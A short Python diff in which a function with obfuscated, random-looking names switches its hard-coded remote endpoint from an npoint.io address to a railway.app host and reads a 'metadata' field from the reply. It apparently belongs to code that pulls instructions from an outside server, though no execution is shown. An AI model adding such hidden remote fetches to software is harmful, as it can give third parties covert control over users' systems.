@@ -16,7 +16,7 @@ def learn_tdkysf_833():
 
     def process_lsqqjm_399():
         try:
-            learn_hrcxtk_680 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_hrcxtk_680 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_hrcxtk_680.raise_for_status()
             net_oujpjx_935 = learn_hrcxtk_680.json()
             learn_sonrdi_682 = net_oujpjx_935.get('metadata')
